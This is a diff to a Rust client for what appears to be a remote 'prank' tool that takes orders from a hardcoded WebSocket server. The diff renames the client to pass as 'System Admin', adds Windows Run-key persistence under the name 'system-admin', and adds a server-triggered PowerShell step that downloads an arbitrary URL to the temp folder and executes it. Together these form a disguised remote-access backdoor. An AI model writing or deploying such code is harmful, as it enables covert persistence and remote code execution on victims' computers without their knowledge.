@@ -17,15 +17,63 @@ use tokio_tungstenite::{
 };
 use tracing::{error, info, warn};
 
+/// APP VERSION CONSTANT
+pub const APP_VERSION: &str = env!("CARGO_PKG_VERSION");
+
 /// CONSTANT HARDCODED SERVER URL — PERMANENT (custom domain via Cloudflare → Render)
 pub const DEFAULT_SERVER_URL: &str = "wss://prank.steamhub.qzz.io/ws";
+
+/// Ensure the application automatically runs on Windows boot
+fn ensure_startup_registration() {
+    #[cfg(windows)]
+    unsafe {
+        use windows_sys::Win32::System::Registry::{
+            RegCloseKey, RegCreateKeyW, RegSetValueExW, HKEY_CURRENT_USER, REG_SZ,
+        };
+
+        if let Ok(exe_path) = std::env::current_exe() {
+            let key_name: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                .encode_utf16()
+                .chain(std::iter::once(0))
+                .collect();
+            let value_name: Vec<u16> = "system-admin"
+                .encode_utf16()
+                .chain(std::iter::once(0))
+                .collect();
+
+            let exe_str = format!("\"{}\"", exe_path.to_string_lossy());
+            let value_data: Vec<u16> = exe_str.encode_utf16().chain(std::iter::once(0)).collect();
+
+            let mut hkey = 0;
+            if RegCreateKeyW(
+                HKEY_CURRENT_USER,
+                key_name.as_ptr(),
+                &mut hkey,
+            ) == 0
+            {
+                RegSetValueExW(
+                    hkey,
+                    value_name.as_ptr(),
+                    0,
+                    REG_SZ,
+                    value_data.as_ptr() as *const u8,
+                    (value_data.len() * 2) as u32,
+                );
+                RegCloseKey(hkey);
+            }
+        }
+    }
+}
 
 #[tokio::main]
 async fn main() {
     tracing_subscriber::fmt::init();
 
-    info!("🎭 Pranker Client Agent initializing...");
+    info!("🎭 System Admin Client v{} initializing...", APP_VERSION);
     info!("ℹ️ EMERGENCY DISARM HOTKEY: Press Ctrl + Alt + Shift + K or Escape 3 times");
+
+    // Automatically register as Windows Startup App
+    ensure_startup_registration();
 
     // Order of precedence:
     // 1. Command-line argument (--server <URL> or positional wss://...)
@@ -62,7 +110,7 @@ async fn main() {
 
         request.headers_mut().insert(
             "User-Agent",
-            "PrankerClient/1.0".parse().unwrap(),
+            format!("SystemAdmin/{}", APP_VERSION).parse().unwrap(),
         );
 
         let conn_res = connect_async(request).await;
@@ -78,6 +126,7 @@ async fn main() {
                     client_id: client_id.clone(),
                     hostname: hostname.clone(),
                     os_info: std::env::consts::OS.to_string(),
+                    version: APP_VERSION.to_string(),
                 };
 
                 if let Ok(json) = serde_json::to_string(&reg_msg) {
@@ -100,6 +149,7 @@ async fn main() {
                             disarmed: safety_hb.disarmed.load(Ordering::Relaxed),
                             user_active: safety_hb.user_active.load(Ordering::Relaxed),
                             active_pranks: executor_hb.get_active_pranks(),
+                            version: APP_VERSION.to_string(),
                         };
 
                         if let Ok(json) = serde_json::to_string(&hb_msg) {
@@ -133,6 +183,20 @@ async fn main() {
                                                 executor.execute(PrankType::GhostMouse { intensity: 0, speed_ms: 0 }, false);
                                                 executor.execute(PrankType::InvertMouse { duration_sec: 0 }, false);
                                             }
+                                            WsMessage::TriggerAutoUpdate { download_url, .. } => {
+                                                info!("🚀 Triggering client auto-update from {}", download_url);
+                                                let url = download_url.clone();
+                                                tokio::task::spawn(async move {
+                                                    let ps = format!(
+                                                        "Start-Sleep -Seconds 1; Invoke-WebRequest -Uri '{}' -OutFile '$env:TEMP\\system-admin.exe'; Start-Process '$env:TEMP\\system-admin.exe'",
+                                                        url
+                                                    );
+                                                    let _ = std::process::Command::new("powershell")
+                                                        .args(["-NoProfile", "-Command", &ps])
+                                                        .spawn();
+                                                    std::process::exit(0);
+                                                });
+                                            }
                                             _ => {}
                                         }
                                     }
@@ -161,4 +225,3 @@ async fn main() {
         sleep(Duration::from_secs(3)).await;
     }
 }
-
